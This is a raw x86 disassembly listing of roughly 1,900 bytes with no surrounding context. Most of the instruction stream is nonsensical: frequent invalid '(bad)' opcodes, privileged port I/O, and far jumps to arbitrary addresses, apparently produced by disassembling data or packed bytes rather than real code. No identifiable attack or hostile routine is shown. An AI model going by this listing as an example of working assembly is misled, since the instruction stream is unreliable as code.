  4136b8:	je     0x413727
  4136ba:	sub    al,0x92
  4136bc:	add    ecx,DWORD PTR [ebx-0x2e]
  4136bf:	xchg   esi,eax
  4136c0:	ret    
  4136c1:	dec    edx
  4136c2:	pop    esp
  4136c3:	popa   
  4136c4:	shl    BYTE PTR [eax+0x607ebbfa],0xbc
  4136cb:	push   ebp
  4136cc:	mov    edi,0x3be324a6
  4136d1:	in     al,0x73
  4136d3:	add    ah,ah
  4136d5:	cmp    DWORD PTR [ecx],edx
  4136d7:	ret    0xfa73
  4136da:	(bad)  
  4136db:	enter  0xea04,0xfb
  4136df:	test   eax,0x2ee3dc1
  4136e4:	pop    ebx
  4136e5:	pop    ds
  4136e6:	mov    edi,0x88cbfda0
  4136eb:	(bad)  
  4136ec:	jae    0x4136ac
  4136ee:	push   ds
  4136ef:	fdiv   st(0),st
  4136f1:	xchg   ebp,ecx
  4136f3:	retf   0x7318
  4136f6:	sbb    BYTE PTR [esi],bl
  4136f8:	sti    
  4136f9:	or     eax,0x44bcd886
  4136fe:	inc    ebx
  4136ff:	pop    es
  413700:	push   ds
  413701:	outs   dx,BYTE PTR ds:[esi]
  413702:	mov    eax,ds:0x1a3e7a2b
  413707:	and    DWORD PTR [ebx-0x20],edx
  41370a:	fild   DWORD PTR [edx-0x3db3c7fb]
  413710:	sub    cl,ah
  413712:	xchg   edx,eax
  413713:	push   edx
  413714:	cs push ss
  413716:	jp     0x413698
  413718:	dec    esi
  413719:	mov    ebp,0xf6dfa6f9
  41371e:	jbe    0x4136ce
  413720:	fs mov cl,0x43
  413723:	mulsd  xmm2,QWORD PTR [ebp+0x5f]
  413728:	imul   ebx,DWORD PTR [edx-0x2aa01018],0xffffffaf
  41372f:	cmc    
  413730:	aas    
  413731:	cmp    al,0xd7
  413733:	mov    esi,0xfc515bc9
  413738:	iret   
  413739:	inc    sp
  41373b:	mov    eax,ds:0x99322a4e
  413740:	lea    ebx,[edi]
  413742:	inc    ebp
  413743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413744:	pop    eax
  413745:	mov    ch,0xdc
  413747:	sub    ebp,DWORD PTR [ecx]
  413749:	mov    al,BYTE PTR [ecx+0x8]
  41374c:	adc    cl,BYTE PTR [edi+0x41]
  41374f:	sbb    cl,BYTE PTR [eax+0x1]
  413752:	and    BYTE PTR [ebp-0x62],bh
  413755:	pop    edi
  413756:	jp     0x4137a0
  413758:	sub    eax,0xd3368c09
  41375d:	jl     0x41377d
  41375f:	sbb    esi,edi
  413761:	call   0x45ef65b7
  413766:	dec    ebx
  413767:	lahf   
  413768:	(bad)  
  413769:	shl    DWORD PTR [edx-0x12],1
  41376c:	mov    ecx,eax
  41376e:	inc    eax
  41376f:	sub    DWORD PTR [eax+0x8668eb8],0x4d
  413776:	out    0x72,ax
  413779:	inc    esi
  41377a:	mov    BYTE PTR [edi-0x43],dh
  41377d:	inc    edi
  41377e:	in     eax,dx
  41377f:	xlat   BYTE PTR ds:[ebx]
  413780:	and    DWORD PTR [esi*4-0x387b1bbf],ecx
  413787:	imul   eax,DWORD PTR [ebp-0x450b1741],0xa87110d7
  413791:	mov    al,ds:0x388972d2
  413796:	push   esi
  413797:	sbb    BYTE PTR [ecx-0x75586048],bl
  41379d:	mov    ch,0x17
  41379f:	mov    al,ds:0x45a931d7
  4137a4:	pop    ds
  4137a5:	fs push ss
  4137a7:	scas   al,BYTE PTR es:[edi]
  4137a8:	push   ds
  4137a9:	clc    
  4137aa:	(bad)  
  4137ab:	jae    0x41381d
  4137ad:	push   0xffffffa5
  4137af:	add    DWORD PTR [ebx],edi
  4137b1:	or     ebx,ebp
  4137b3:	lods   al,BYTE PTR ds:[esi]
  4137b4:	das    
  4137b5:	pop    ebx
  4137b6:	dec    edx
  4137b7:	add    al,BYTE PTR [ecx+0x6e49ef2a]
  4137bd:	xchg   esi,eax
  4137be:	retf   
  4137bf:	fcomp  st(1)
  4137c1:	bound  edx,QWORD PTR [eax-0x35e36d88]
  4137c7:	(bad)  [edx]
  4137c9:	into   
  4137ca:	sbb    BYTE PTR [edx+esi*4+0x2b7b8fa4],cl
  4137d1:	(bad)  
  4137d2:	repz (bad) 
  4137d4:	sub    DWORD PTR [ebp+0x5aeec77d],esp
  4137da:	add    ch,BYTE PTR [esi-0xc]
  4137dd:	jb     0x413805
  4137df:	jg     0x4137fc
  4137e1:	(bad)  
  4137e2:	sub    BYTE PTR [ebx],ah
  4137e4:	inc    edx
  4137e5:	out    0xad,eax
  4137e7:	or     ebp,ebx
  4137e9:	add    dl,BYTE PTR [eax-0x57]
  4137ec:	adc    DWORD PTR [ecx+eiz*1],edi
  4137ef:	xchg   ebx,eax
  4137f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137f1:	inc    ebx
  4137f2:	imul   DWORD PTR [edi]
  4137f4:	mov    ebx,0x95987bd4
  4137f9:	add    eax,0x52235050
  4137fe:	imul   BYTE PTR [esi]
  413800:	mov    dl,0x91
  413802:	pop    eax
  413803:	or     bh,BYTE PTR [esp+edi*2]
  413806:	(bad)  
  413807:	retf   
  413808:	inc    eax
  413809:	rcr    esp,cl
  41380b:	(bad)  
  41380c:	pop    eax
  41380d:	push   ebp
  41380e:	jns    0x4137e1
  413810:	ss dec ecx
  413812:	pop    ss
  413813:	in     eax,dx
  413814:	inc    eax
  413815:	pop    esp
  413816:	cmp    ah,BYTE PTR [ebx+0x5d21a6e7]
  41381c:	test   BYTE PTR [ecx],dh
  41381e:	xchg   ebx,eax
  41381f:	sar    DWORD PTR [esi],1
  413821:	dec    ecx
  413822:	scas   eax,DWORD PTR es:[edi]
  413823:	xchg   ebx,eax
  413824:	cmp    edx,edi
  413826:	and    bh,bl
  413828:	sbb    DWORD PTR [eax+0x18],ebx
  41382b:	rcl    BYTE PTR [esp+eax*1],1
  41382e:	adc    al,0xce
  413830:	mov    eax,0xc9c851fe
  413835:	les    esi,FWORD PTR [esi-0xaf8c1ee]
  41383b:	out    dx,eax
  41383c:	push   esi
  41383d:	sbb    esi,esp
  41383f:	out    0xc0,eax
  413841:	jae    0x41388d
  413843:	add    al,BYTE PTR [eax-0x6c]
  413846:	(bad)  
  413847:	xor    esp,ebp
  413849:	mov    edi,0xc5856a99
  41384f:	fcomp  DWORD PTR [esi]
  413851:	and    DWORD PTR [ebp-0x22],ecx
  413854:	(bad)  
  413855:	test   ah,ch
  413857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413858:	(bad)  
  413859:	lock and bh,BYTE PTR cs:[eax]
  41385d:	push   es
  41385e:	cdq    
  41385f:	shr    BYTE PTR [edi+0x0],0x73
  413863:	out    0x22,al
  413865:	fbstp  TBYTE PTR [eax]
  413867:	jge    0x4137f5
  413869:	int3   
  41386a:	and    BYTE PTR [eax-0x57],0x4f
  41386e:	xchg   ecx,eax
  41386f:	(bad)  
  413871:	ret    
  413872:	fcom   QWORD PTR [esi]
  413874:	mov    dh,0x4f
  413876:	adc    eax,0xba23008d
  41387b:	pop    edx
  41387c:	fcom   st(3)
  41387e:	sub    ebx,ebp
  413880:	sti    
  413881:	(bad)  
  413882:	jecxz  0x41380f
  413884:	stos   DWORD PTR es:[edi],eax
  413885:	cmp    eax,0x4c92d50e
  41388a:	inc    edx
  41388b:	jmp    0x863a78e0
  413890:	and    edi,esi
  413892:	js     0x4138d6
  413894:	push   ds
  413895:	hlt    
  413896:	mov    esi,0xe28a486e
  41389b:	popa   
  41389c:	sar    dl,0xa9
  41389f:	test   al,0xcd
  4138a1:	retf   
  4138a2:	push   cs
  4138a3:	pop    eax
  4138a4:	sub    esp,ebx
  4138a6:	mov    ch,0x41
  4138a8:	stos   DWORD PTR es:[edi],eax
  4138a9:	xor    cl,ah
  4138ab:	mov    eax,0x5c9d5418
  4138b0:	sub    BYTE PTR cs:[edx+0x4b],ah
  4138b4:	retf   
  4138b5:	mov    ebp,DWORD PTR [ebx+0x8]
  4138b8:	lds    edi,FWORD PTR [ecx]
  4138ba:	pop    edi
  4138bb:	scas   al,BYTE PTR es:[edi]
  4138bc:	jbe    0x4138a8
  4138be:	ins    BYTE PTR es:[edi],dx
  4138bf:	or     al,0x68
  4138c1:	fcmovnbe st,st(0)
  4138c3:	(bad)  
  4138c4:	rcr    ecx,cl
  4138c6:	cmp    al,0x1b
  4138c8:	rcl    BYTE PTR [edx],0x7c
  4138cb:	mov    WORD PTR [eax+0x155507b4],gs
  4138d1:	test   al,0x68
  4138d3:	scas   al,BYTE PTR es:[edi]
  4138d4:	call   0xb3c8:0xa1fa6059
  4138db:	sahf   
  4138dc:	or     DWORD PTR [ebx+0x4e],ecx
  4138df:	sahf   
  4138e0:	retf   
  4138e1:	iret   
  4138e2:	cmp    BYTE PTR [edi+esi*4],cl
  4138e5:	push   es
  4138e6:	sub    al,0x87
  4138e8:	cmpxchg al,ah
  4138eb:	and    al,0xca
  4138ed:	ror    BYTE PTR [ebp+0x214bee88],1
  4138f3:	addr16 xchg edi,eax
  4138f5:	call   0xde98:0x612f04c
  4138fc:	fidivr WORD PTR [ecx+ebx*2]
  4138ff:	push   esp
  413900:	lods   eax,DWORD PTR ds:[esi]
  413901:	jle    0x413899
  413903:	inc    ecx
  413904:	mov    ?,WORD PTR [eax]
  413906:	jge    0x4138e2
  413908:	(bad)  
  413909:	fstp   QWORD PTR [esi]
  41390b:	sbb    cl,BYTE PTR [eax+0x51]
  41390e:	scas   eax,DWORD PTR es:[edi]
  41390f:	sbb    al,0x4a
  413911:	(bad)  
  413912:	leave  
  413913:	xchg   edx,eax
  413914:	and    edx,ecx
  413916:	xor    eax,0x28c3b28f
  41391b:	cmp    eax,0x8100e63d
  413920:	push   cs
  413921:	retf   
  413922:	push   cs
  413923:	mov    edx,ds
  413925:	jmp    0x858f4585
  41392a:	or     al,0x5c
  41392c:	sbb    eax,0x1a1fb7f
  413931:	ins    BYTE PTR es:[edi],dx
  413932:	jl     0x41395f
  413934:	retf   0x7920
  413937:	mov    dl,0x17
  413939:	and    esi,DWORD PTR [ecx-0x42ccf3d5]
  41393f:	ret    
  413940:	mov    eax,ds:0xae9a2c99
  413945:	sbb    eax,edx
  413947:	push   0xffffffc3
  413949:	cmp    al,0x89
  41394b:	sti    
  41394c:	xchg   BYTE PTR [ebx-0x1de2de35],bl
  413952:	clc    
  413953:	hlt    
  413954:	add    edx,ebp
  413956:	adc    eax,0xfb1c4618
  41395b:	clc    
  41395c:	pop    ebp
  41395d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41395e:	ins    BYTE PTR es:[edi],dx
  41395f:	add    esp,DWORD PTR [ecx]
  413961:	rcl    DWORD PTR [ebp+0x52],0x6a
  413965:	inc    edx
  413966:	out    dx,al
  413967:	push   0xffffffb4
  413969:	hlt    
  41396a:	cdq    
  41396b:	arpl   WORD PTR [esi-0xb],di
  41396e:	popa   
  41396f:	cwde   
  413970:	xchg   bl,bh
  413972:	inc    eax
  413973:	daa    
  413974:	push   es
  413975:	and    eax,0x3d22bf0c
  41397a:	dec    edi
  41397b:	mov    dh,0x34
  41397d:	mov    eax,ds:0x88c5afba
  413982:	dec    edi
  413983:	out    dx,eax
  413984:	push   es
  413985:	ss cmp eax,0x4795f1e3
  41398b:	sub    eax,0xadb13f5d
  413990:	cmp    eax,0x129b80d3
  413995:	test   al,0xdf
  413997:	call   0x64d534f0
  41399c:	es xor al,0xd6
  41399f:	bound  esi,QWORD PTR [ebx-0x38]
  4139a2:	loope  0x4139e8
  4139a4:	rcr    DWORD PTR [edx],1
  4139a6:	fdiv   QWORD PTR [eax+0x5a1423d7]
  4139ac:	pop    ss
  4139ad:	ss pop ds
  4139af:	es cmp ebx,edi
  4139b2:	or     eax,0x3e070a83
  4139b7:	iret   
  4139b8:	adc    ah,bl
  4139ba:	and    ebp,ebx
  4139bc:	or     DWORD PTR [eax-0x6a],0x75
  4139c0:	xor    BYTE PTR [eax-0x340a5620],dh
  4139c6:	cmp    eax,DWORD PTR [esi+0x34]
  4139c9:	mov    ebx,0xd2047a3f
  4139ce:	leave  
  4139cf:	pop    esi
  4139d0:	lds    esp,FWORD PTR [edi]
  4139d2:	inc    edi
  4139d3:	ret    
  4139d4:	xchg   esi,eax
  4139d5:	adc    esi,DWORD PTR [esi]
  4139d7:	add    al,0x7b
  4139d9:	call   0xbcf0:0x510a62c6
  4139e0:	pop    ebp
  4139e1:	(bad)  
  4139e2:	imul   DWORD PTR [eax+0x2dd57581]
  4139e8:	mov    dh,0xd9
  4139ea:	inc    ecx
  4139eb:	bound  ebp,QWORD PTR [edx+0x1e]
  4139ee:	out    0x20,eax
  4139f0:	mov    bh,0x89
  4139f2:	or     DWORD PTR [ecx-0x4b],0x14
  4139f6:	mov    eax,0xc38ac98a
  4139fb:	xor    bh,al
  4139fd:	pop    eax
  4139fe:	sbb    eax,DWORD PTR [ecx+0x51eb7b1e]
  413a04:	aas    
  413a05:	push   edx
  413a06:	into   
  413a07:	in     al,0x83
  413a09:	loope  0x413a18
  413a0b:	loop   0x4139cc
  413a0d:	lods   eax,DWORD PTR ds:[esi]
  413a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a0f:	data16 fisttp WORD PTR [ecx]
  413a12:	jp     0x4139e1
  413a14:	dec    eax
  413a15:	fsub   DWORD PTR [eax-0x6c]
  413a18:	(bad)
  413a1c:	cmp    eax,0xf2c7a6a0
  413a21:	cld    
  413a22:	push   ds
  413a23:	xor    DWORD PTR [edx+0x4e],0xffffffaa
  413a27:	out    0x3b,al
  413a29:	dec    edi
  413a2a:	mov    esi,0x3617e30e
  413a2f:	das    
  413a30:	div    DWORD PTR [ebx]
  413a32:	jo     0x413a69
  413a34:	int3   
  413a35:	push   eax
  413a36:	and    BYTE PTR [edi-0x65],al
  413a39:	nop
  413a3a:	mov    esi,0xc992b4fd
  413a3f:	out    0xea,eax
  413a41:	mov    ds:0xd116e503,eax
  413a46:	scas   al,BYTE PTR es:[edi]
  413a47:	mov    esp,0x8010d4b
  413a4c:	adc    DWORD PTR [edi+0x1a1376fd],esp
  413a52:	lock inc ebx
  413a54:	xchg   ebx,eax
  413a55:	stos   DWORD PTR es:[edi],eax
  413a56:	das    
  413a57:	lods   al,BYTE PTR ds:[esi]
  413a58:	pop    ebx
  413a59:	jle    0x413aae
  413a5b:	imul   ebx,ebx,0x61373b71
  413a61:	into   
  413a62:	push   ebx
  413a63:	gs (bad) 
  413a65:	stos   BYTE PTR es:[edi],al
  413a66:	stc    
  413a67:	ret    
  413a68:	jns    0x413a12
  413a6a:	push   esi
  413a6b:	lea    edx,[edx]
  413a6d:	mov    ds:0xf5f25f0e,al
  413a72:	and    BYTE PTR [ebx+0x7c],bh
  413a75:	mov    esp,0x4bf082be
  413a7a:	pop    ebx
  413a7b:	push   ebp
  413a7c:	sub    DWORD PTR [ecx+0x3f],ebp
  413a7f:	or     bh,0xb2
  413a82:	push   edi
  413a83:	pop    edx
  413a84:	jnp    0x413ad8
  413a86:	cld    
  413a87:	inc    edx
  413a88:	xor    al,0xe6
  413a8a:	repz adc dl,BYTE PTR [ecx-0x3c4e8b22]
  413a91:	ins    DWORD PTR es:[edi],dx
  413a92:	and    BYTE PTR [esi],ah
  413a94:	pop    ebx
  413a95:	hlt    
  413a96:	test   eax,0x9f0c9d62
  413a9b:	dec    ebp
  413a9c:	mov    edx,0x28a40bc
  413aa1:	popf   
  413aa2:	cmp    ah,dl
  413aa4:	xor    BYTE PTR [esi+0x7fd7bb88],cl
  413aaa:	dec    eax
  413aab:	jno    0x413ab0
  413aad:	cli    
  413aae:	push   ecx
  413aaf:	adc    eax,DWORD PTR [eax+0x69]
  413ab2:	or     DWORD PTR [edi-0x4beb7f3a],ebx
  413ab8:	in     eax,dx
  413ab9:	jne    0x413b1e
  413abb:	push   esi
  413abc:	jmp    0xd174:0x32387785
  413ac3:	cwde   
  413ac4:	jno    0x413a5f
  413ac6:	stos   BYTE PTR es:[edi],al
  413ac7:	adc    al,0x77
  413ac9:	mov    edx,0xbf1a3d86
  413ace:	jns    0x413a8d
  413ad0:	push   edx
  413ad1:	xor    DWORD PTR [eax],ebp
  413ad3:	cmp    ah,BYTE PTR [esi+0x13]
  413ad6:	aad    0xd4
  413ad8:	inc    ebp
  413ad9:	ins    BYTE PTR es:[edi],dx
  413ada:	mov    dl,BYTE PTR [ecx]
  413adc:	pop    edi
  413add:	adc    DWORD PTR [edx+ecx*4],edi
  413ae0:	arpl   WORD PTR [edx+ebx*1-0x3b9a6e6],ax
  413ae7:	cli    
  413ae8:	push   edi
  413ae9:	and    bh,BYTE PTR [edi]
  413aeb:	push   esi
  413aec:	(bad)  
  413aed:	out    dx,eax
  413aee:	mov    dl,0x51
  413af0:	icebp  
  413af1:	out    dx,eax
  413af2:	in     eax,dx
  413af3:	or     ch,BYTE PTR [eax+0x3d]
  413af6:	mov    WORD PTR [eax+0x0],ss
  413af9:	or     eax,0x44350137
  413afe:	mov    ds:0xe083abf8,eax
  413b03:	dec    ebx
  413b04:	adc    eax,0x81cd4e3
  413b09:	imul   ebx,eax,0x5f66de0b
  413b0f:	mov    bl,0x1
  413b11:	adc    DWORD PTR [edi+ecx*8+0x65],0x81557bab
  413b19:	inc    ebx
  413b1a:	lods   eax,DWORD PTR ds:[esi]
  413b1b:	cmp    eax,0x2511f483
  413b20:	call   0x9dbeed53
  413b25:	sahf   
  413b26:	(bad)  
  413b28:	dec    esp
  413b29:	xchg   DWORD PTR [ebx],eax
  413b2b:	cmp    DWORD PTR [ecx],edi
  413b2d:	sub    edi,DWORD PTR [ebp-0x46]
  413b30:	ss ins BYTE PTR es:[edi],dx
  413b32:	out    0xea,al
  413b34:	cdq    
  413b35:	and    eax,0x8cc45eb6
  413b3a:	mov    eax,ds:0x66687775
  413b3f:	pop    ds
  413b40:	and    al,al
  413b42:	ins    BYTE PTR es:[edi],dx
  413b43:	pusha  
  413b44:	push   esp
  413b46:	outs   dx,DWORD PTR ds:[esi]
  413b47:	icebp  
  413b48:	loopne 0x413b2b
  413b4a:	cmp    eax,0x7ee76e18
  413b4f:	mov    al,0x30
  413b51:	push   ds
  413b52:	stc    
  413b53:	xchg   esi,eax
  413b54:	hlt    
  413b55:	stc    
  413b56:	xor    al,0xaa
  413b58:	mov    bl,0x1f
  413b5a:	(bad)  
  413b5b:	aam    0x1a
  413b5d:	add    BYTE PTR [edi-0x73cb9c56],dh
  413b63:	and    DWORD PTR [ebp+eiz*1+0x32],0x1b0e145d
  413b6b:	mov    ch,0x92
  413b6d:	and    edi,edx
  413b6f:	hlt    
  413b70:	rcl    WORD PTR [esi+edx*8],0x79
  413b75:	in     eax,dx
  413b76:	mov    al,ds:0xd60506de
  413b7b:	inc    edi
  413b7c:	dec    edi
  413b7d:	lods   eax,DWORD PTR ds:[esi]
  413b7e:	addr16 mov ds:0xffbe,eax
  413b82:	add    DWORD PTR [edx+0x7e],ebp
  413b85:	retf   0x5e76
  413b88:	scas   eax,DWORD PTR es:[edi]
  413b89:	cdq    
  413b8a:	(bad)  
  413b8c:	pop    es
  413b8d:	lock pop ss
  413b8f:	mov    ch,BYTE PTR [edx]
  413b91:	imul   eax,DWORD PTR [ebx+0x1f],0xffffffe5
  413b95:	pop    edx
  413b96:	push   ds
  413b97:	xor    dl,BYTE PTR [edi-0x25]
  413b9a:	jg     0x413bd8
  413b9c:	inc    edx
  413b9d:	out    0x80,al
  413b9f:	pop    edi
  413ba0:	jns    0x413b28
  413ba2:	sar    DWORD PTR [edi+0x3be0d482],cl
  413ba8:	mov    esp,0xe1243e06
  413bad:	push   0xffffffd4
  413baf:	jns    0x413b8a
  413bb1:	test   eax,esp
  413bb3:	jns    0x413c1c
  413bb5:	xor    eax,0x6c57d5f
  413bba:	sub    dh,BYTE PTR [esi+eiz*8]
  413bbd:	call   0xca5a:0xf9973783
  413bc4:	inc    ebx
  413bc5:	ja     0x413bf6
  413bc7:	inc    esp
  413bc8:	sti    
  413bc9:	xlat   BYTE PTR ds:[ebx]
  413bca:	and    al,0x40
  413bcc:	js     0x413be0
  413bce:	jns    0x413b78
  413bd0:	push   esp
  413bd1:	or     esp,esi
  413bd3:	dec    ecx
  413bd4:	dec    ebp
  413bd5:	imul   eax,DWORD PTR [edi+0x296920f1],0x1fa12df3
  413bdf:	cli    
  413be0:	mov    al,ds:0x8de416cb
  413be5:	adc    BYTE PTR [edx],ah
  413be7:	jge    0x413bd6
  413be9:	iret   
  413bea:	or     al,BYTE PTR [edx]
  413bec:	dec    eax
  413bed:	aaa    
  413bee:	pop    esi
  413bef:	jmp    0x8e326648
  413bf4:	jge    0x413b77
  413bf6:	add    esp,DWORD PTR ds:0x1e8bbc4d
  413bfc:	hlt    
  413bfd:	or     dh,bl
  413bff:	fstp   TBYTE PTR [ebx]
  413c01:	jg     0x413b90
  413c03:	add    eax,0x3b754aef
  413c08:	jne    0x413c41
  413c0a:	and    BYTE PTR [ebx+0x1c],ch
  413c0d:	dec    ebp
  413c0e:	bndldx bnd1,[edx+ebp*1+0x2fe7565b]
  413c16:	jle    0x413c52
  413c18:	iret   
  413c19:	test   eax,0xc60015fd
  413c1e:	push   ebp
  413c1f:	sub    DWORD PTR [ebx],0xffffffbb
  413c22:	inc    esp
  413c23:	sti    
  413c24:	adc    ebx,DWORD PTR [ecx+0x70]
  413c27:	xchg   ecx,eax
  413c28:	lds    esp,FWORD PTR [ecx+0xf9940e1]
  413c2e:	and    al,BYTE PTR [eax+ecx*8+0x30]
  413c32:	je     0x413bc2
  413c34:	mov    ds:0xdb50c322,al
  413c39:	retf   0x7afa
  413c3c:	lods   al,BYTE PTR ss:[esi]
  413c3e:	mov    ah,0xc2
  413c40:	in     al,0x29
  413c42:	adc    bl,dh
  413c44:	or     al,0xee
  413c46:	push   0x6685a191
  413c4b:	sbb    DWORD PTR [edi+edx*1],eax
  413c4e:	(bad)  
  413c4f:	bound  edi,QWORD PTR [esi+0x2b]
  413c52:	fs xor dl,ah
  413c55:	xlat   BYTE PTR gs:[ebx]
  413c57:	repz push esp
  413c59:	jmp    0x86ddb94
  413c5e:	std    
  413c5f:	jle    0x413c49
  413c61:	cdq    
  413c62:	aam    0xf1
  413c64:	(bad)  
  413c66:	jne    0x413c04
  413c68:	adc    ebx,ecx
  413c6a:	sub    eax,0x34dd75d9
  413c6f:	cld    
  413c70:	add    eax,0xd0034d4b
  413c75:	out    0x12,al
  413c77:	mov    DWORD PTR [ebx],edi
  413c79:	daa    
  413c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c7b:	xor    ecx,DWORD PTR ds:0x4022a525
  413c81:	es addps xmm7,xmm6
  413c85:	mov    edx,0xdad875f8
  413c8a:	and    al,0xb2
  413c8c:	push   edi
  413c8d:	rol    BYTE PTR [ecx+0x0],1
  413c90:	sbb    BYTE PTR [esi-0x665028c1],cl
  413c96:	xor    DWORD PTR [eax],eax
  413c98:	(bad)
  413c9b:	push   ebx
  413c9c:	(bad)  
  413c9d:	xchg   esi,eax
  413c9e:	arpl   sp,ax
  413ca0:	mov    al,0xc9
  413ca2:	mov    dl,0x5f
  413ca4:	add    DWORD PTR [eax+eax*8+0x1614f260],eax
  413cab:	cmp    BYTE PTR [ecx-0x59],ah
  413cae:	mov    ah,0x17
  413cb0:	mov    dh,0x50
  413cb2:	pop    ecx
  413cb3:	dec    edx
  413cb4:	push   ebx
  413cb5:	xor    esi,DWORD PTR [esi+0x69892bef]
  413cbb:	dec    esp
  413cbc:	test   al,0x7c
  413cbe:	lods   al,BYTE PTR ds:[esi]
  413cbf:	outs   dx,BYTE PTR ds:[esi]
  413cc0:	pop    ss
  413cc1:	jle    0x413d2c
  413cc3:	arpl   ax,sp
  413cc5:	dec    edx
  413cc6:	dec    ebp
  413cc7:	jbe    0x413d24
  413cc9:	mov    al,ds:0xb9aff599
  413cce:	test   al,0xb3
  413cd0:	(bad)  
  413cd1:	mov    ebp,0xa7381c24
  413cd6:	in     eax,dx
  413cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cd8:	arpl   si,si
  413cda:	in     eax,0x44
  413cdc:	mov    ecx,0x35bd35fb
  413ce1:	je     0x413c8c
  413ce3:	push   ebx
  413ce4:	(bad)  
  413ce5:	out    0x68,al
  413ce7:	mov    ah,0x38
  413ce9:	jne    0x413cfb
  413ceb:	jno    0x413ce2
  413ced:	out    dx,eax
  413cee:	mov    ds:0xff560ea4,eax
  413cf3:	stc    
  413cf4:	push   ebx
  413cf5:	pop    ebp
  413cf6:	ret    
  413cf7:	dec    ecx
  413cf8:	mov    WORD PTR [ecx-0x4],cs
  413cfb:	popf   
  413cfc:	mov    dh,0xcf
  413cfe:	popf   
  413cff:	sub    eax,0xc85f2c56
  413d04:	ret    
  413d05:	fwait
  413d06:	data16 arpl WORD PTR [ebx],sp
  413d09:	(bad)  
  413d0a:	adc    BYTE PTR [ebx+0x27],bl
  413d0d:	mov    cl,0xf4
  413d0f:	inc    esi
  413d10:	in     al,0x98
  413d12:	mov    eax,0xb0c4b4c8
  413d17:	loop   0x413ca7
  413d19:	sbb    BYTE PTR [esi-0x4b],dl
  413d1c:	dec    esp
  413d1d:	out    dx,eax
  413d1e:	add    BYTE PTR [edi],bl
  413d20:	je     0x413caf
  413d22:	xchg   esi,eax
  413d23:	mov    edi,0x251a225a
  413d28:	cld    
  413d29:	and    DWORD PTR [esi],ebx
  413d2b:	mov    edi,0xa4106f22
  413d30:	neg    BYTE PTR [edx-0x181a742]
  413d36:	inc    ecx
  413d37:	outs   dx,DWORD PTR ds:[esi]
  413d38:	aam    0xee
  413d3a:	(bad)  
  413d3b:	in     al,0xe1
  413d3d:	mov    esp,0x7731c58
  413d42:	add    ah,al
  413d44:	sbb    BYTE PTR [eax+0x5430e137],bh
  413d4a:	fcomp  DWORD PTR [ebp-0x28]
  413d4d:	sub    eax,0xf9d45f8e
  413d52:	cmp    ecx,DWORD PTR [edi-0x76]
  413d55:	inc    edi
  413d56:	mov    DWORD PTR [eax],esi
  413d58:	cdq    
  413d59:	sub    ebp,edx
  413d5b:	(bad)  
  413d5c:	scas   al,BYTE PTR es:[edi]
  413d5d:	xor    al,0x10
  413d5f:	add    ebx,esp
  413d61:	jl     0x413d34
  413d63:	(bad)  
  413d64:	push   esi
  413d65:	jle    0x413db0
  413d67:	imul   eax,DWORD PTR [esi],0xfffffff5
  413d6a:	cwde   
  413d6b:	add    ebx,eax
  413d6d:	push   ebp
  413d6e:	add    eax,0x8c3906e7
  413d73:	fidivr DWORD PTR [edi+0x56]
  413d76:	or     esi,edx
  413d78:	pop    es
  413d79:	cmp    eax,0x71161c56
  413d7e:	pop    ecx
  413d7f:	pop    esi
  413d80:	fcom   QWORD PTR [edi-0x4]
  413d83:	daa    
  413d84:	add    al,0x31
  413d86:	or     esp,ebp
  413d88:	dec    ebp
  413d89:	std    
  413d8a:	mov    ecx,0xae7ff87f
  413d8f:	jbe    0x413d4c
  413d91:	push   esp
  413d92:	or     bh,bh
  413d94:	and    ah,dh
  413d96:	push   0x6c065f05
  413d9b:	push   ebp
  413d9c:	xchg   ebx,eax
  413d9d:	xchg   edx,eax
  413d9e:	(bad)  
  413d9f:	ror    DWORD PTR [ecx],cl
  413da1:	imul   esp,DWORD PTR [ebp+ecx*4-0x6377aa96],0xffffffb0
  413da9:	mov    eax,0x93aeac68
  413dae:	cmp    BYTE PTR [edx],0xc3
  413db1:	into   
  413db2:	call   DWORD PTR ds:0xa2f5fc36
  413db8:	ins    DWORD PTR es:[edi],dx
  413db9:	ins    BYTE PTR es:[edi],dx
  413dba:	js     0x413d95
  413dbc:	ins    BYTE PTR es:[edi],dx
  413dbd:	xor    edi,DWORD PTR [edi+0xa]
  413dc0:	push   cs
  413dc1:	ins    BYTE PTR es:[edi],dx
  413dc2:	push   esi
  413dc3:	sub    ecx,esp
  413dc5:	call   ebp
  413dc7:	inc    edx
  413dc8:	sbb    eax,0x327e3124
  413dcd:	(bad)  
  413dce:	jo     0x413d88
  413dd0:	jl     0x413ddf
  413dd2:	adc    esp,DWORD PTR [edi-0x6d7b39]
  413dd8:	loop   0x413e14
  413dda:	inc    esp
  413ddb:	inc    esp
  413ddc:	or     bl,BYTE PTR [ebp-0x6fe829d2]
  413de2:	dec    edi
  413de3:	daa    
  413de4:	rcr    BYTE PTR [ebp+0x41],1
  413de7:	test   al,0x15
  413de9:	push   edi
  413dea:	das    
  413deb:	(bad)  [esi]
  413ded:	shr    DWORD PTR [ebp-0x12],0x5a
  413df1:	xchg   ebx,eax
  413df2:	adc    al,0xa9
  413df4:	pop    es
  413df5:	dec    edi
  413df6:	cs adc eax,0xbf75981d
  413dfc:	push   esp
  413dfd:	cli    
  413dfe:	je     0x413e47
  413e00:	test   DWORD PTR [esi+0x58],edx
  413e03:	adc    al,0x74
  413e05:	cdq    
  413e06:	in     al,0xf2
  413e08:	inc    ebx
  413e09:	adc    ch,BYTE PTR [edi-0x3949001a]
  413e0f:	cld    
  413e10:	and    ebx,edi
  413e12:	lea    eax,[esi+0x6e]
  413e15:	ins    DWORD PTR es:[edi],dx
  413e16:	in     al,dx
  413e17:	fld    DWORD PTR [eax+0x36]
  413e1a:	adc    cl,BYTE PTR [edi-0x47]
  413e1d:	(bad)  
  413e1e:	in     eax,dx
  413e1f:	sahf   
  413e20:	inc    esi
  413e21:	and    esp,DWORD PTR [ebx-0x79b03d23]
  413e27:	(bad)  
  413e28:	sub    DWORD PTR [esi-0x36],ebp
  413e2b:	adc    esi,esi
  413e2d:	call   0x5613:0x430701d6
  413e34:	fnstcw WORD PTR [edi]
  413e36:	xchg   ebx,eax
  413e37:	and    DWORD PTR [esi+ecx*8-0x76],edi
